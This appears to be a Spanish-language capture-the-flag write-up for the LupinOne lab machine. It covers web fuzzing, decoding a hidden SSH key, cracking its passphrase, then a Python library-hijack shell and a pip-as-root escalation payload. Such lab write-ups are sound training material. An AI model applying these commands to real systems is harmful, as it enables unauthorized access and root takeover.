# Empire: LupinOne

## # Máquina: Empire LupinOne

**IP:** 192.168.0.35
**OS:** Linux (Debian 11)
**Dificultad:** Easy-Medium
**Servicios Clave:** HTTP / SSH
**Fecha:** 2026-04-24
**Skills:** #WebFuzzing #Esteganografia #Base58 #SSHKeyHijacking #PythonLibraryHijacking #PipPrivesc

---

## 1. Reconocimiento

```shell
nmap -p- -sV -sC --min-rate 5000 192.168.0.35
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 80 | HTTP | Apache 2.4.48 (Debian) |

**Datos relevantes del escaneo:**
- Nmap encontró automáticamente `robots.txt` con una entrada desautorizada: `/~myfiles`
- Solo dos puertos abiertos — el vector principal es el puerto 80

---

## 2. Enumeración Web

### Página principal — puerto 80

La página principal mostraba solo una imagen de Arsène Lupin. Al ver el código fuente (`Ctrl+U`) se encontró un comentario al final:

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
-->
```

Sin información útil directamente.

### robots.txt

```
User-agent: *
Disallow: /~myfiles
```

La ruta `/~myfiles` devolvía un 404 falso — el servidor devolvía código 200 con HTML que simulaba un error. Otro comentario: `keep trying`.

### Fuzzing de directorios ~FUZZ

La clave fue usar ffuf con una wordlist de directorios genéricos, **no de usuarios**:

```shell
ffuf -u "http://192.168.0.35/~FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,301,302 \
  -t 100
```

**Resultado:** `/~secret` — directorio accesible con mensaje del usuario icex64 indicando que su clave SSH privada estaba oculta en ese directorio.

> **Lección aprendida:** Cuando fuzzes `~FUZZ` usa wordlists de directorios genéricos, no de usuarios. El nombre puede ser cualquier palabra.

### Búsqueda de archivo oculto en /~secret

Los archivos ocultos en Linux empiezan por `.`. Se usó ffuf con punto como prefijo:

```shell
ffuf -u "http://192.168.0.35/~secret/.FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -e .txt \
  -mc 200 \
  -t 100
```

**Resultado:** `/.mysecret.txt` — contenía una cadena enorme de texto codificado en **Base58**.

### Decodificación Base58

Se usó CyberChef (`https://cyberchef.org`) con la operación **From Base58** para decodificar el contenido. El resultado fue una **clave SSH privada RSA**.

---

## 3. Acceso inicial — SSH como icex64

### Preparar la clave SSH

```shell
# Guardar la clave decodificada
nano clave_privada
# Pegar el contenido de CyberChef (-----BEGIN OPENSSH PRIVATE KEY-----)

# Permisos correctos (obligatorio)
chmod 600 clave_privada
```

### Crackear la passphrase con John

El mensaje en `/~secret` mencionaba explícitamente usar **fasttrack** para crackear la passphrase:

```shell
ssh2john clave_privada > hash_rsa.txt
john hash_rsa.txt --wordlist=/usr/share/wordlists/fasttrack.txt
```

**Passphrase encontrada:** `P@55w0rd!`

### Conexión SSH

```shell
ssh -i clave_privada icex64@192.168.0.35
# Passphrase: P@55w0rd!
```

**Flag de usuario:** `3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}`

---

## 4. Escalada de Privilegios — icex64 → arsene

### Reconocimiento

```shell
sudo -l
# (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py

find / -perm -4000 -type f 2>/dev/null
# Binarios SUID estándar — ninguno explotable

getcap -r / 2>/dev/null
# Sin capabilities relevantes
```

### Análisis del script heist.py

```python
import webbrowser
print("Its not yet ready to get in action")
webbrowser.open("https://empirecybersecurity.co.mz")
```

El script importa el módulo `webbrowser` de Python. El vector es **Python Library Hijacking** — modificar el módulo real para que ejecute código malicioso.

### Python Library Hijacking

El módulo real estaba en `/usr/lib/python3.9/webbrowser.py` y tenía permisos de escritura para icex64:

```shell
ls -la /usr/lib/python3.9/webbrowser.py
# -rw-r--rw- → escritura para otros
```

Se editó el archivo añadiendo al principio:

```shell
nano /usr/lib/python3.9/webbrowser.py
```

```python
import os
os.system('/bin/bash')
```

Luego se ejecutó el script como arsene:

```shell
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
whoami
# arsene
```

---

## 5. Escalada de Privilegios — arsene → root

### sudo -l como arsene

```shell
sudo -l
# (root) NOPASSWD: /usr/bin/pip
```

arsene puede ejecutar **pip** como root sin contraseña.

### Escalada via pip (GTFOBins)

```shell
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
whoami
# root
```

**Flag de root:** `3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}`

---

## 6. Resumen del ataque

```
Nmap → Puerto 80 (Apache) y 22 (SSH)
         ↓
robots.txt → /~myfiles (pista falsa)
         ↓
ffuf con directory-list → /~secret
         ↓
ffuf con .FUZZ → /.mysecret.txt (clave SSH en Base58)
         ↓
CyberChef Base58 → clave SSH privada RSA
         ↓
ssh2john + john + fasttrack → P@55w0rd!
         ↓
SSH como icex64 → flag usuario
         ↓
sudo -l → puede ejecutar heist.py como arsene
         ↓
heist.py importa webbrowser → /usr/lib/python3.9/webbrowser.py es escribible
         ↓
Python Library Hijacking → shell como arsene
         ↓
sudo -l → arsene puede ejecutar pip como root
         ↓
pip GTFOBins → ROOT ✅
         ↓
Flag root: 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
```

---

## 7. Lecciones aprendidas

- Al fuzzear rutas `~FUZZ` usar **wordlists de directorios genéricos**, no de usuarios — el nombre puede ser cualquier palabra.
- Los archivos ocultos en Linux empiezan por `.` — buscarlos con `ffuf` usando `.FUZZ` como patrón.
- Cuando un script Python importa un módulo, si ese módulo es **escribible**, puedes modificarlo para ejecutar código malicioso — **Python Library Hijacking**.
- **pip con sudo** es un vector directo a root — siempre buscar en GTFOBins cuando aparece en `sudo -l`.
- El mensaje en `/~secret` daba pistas explícitas: usuario `icex64`, wordlist `fasttrack`, archivo oculto con `.`.
- Base58 es un encoding común en CTFs — CyberChef lo identifica y decodifica automáticamente.
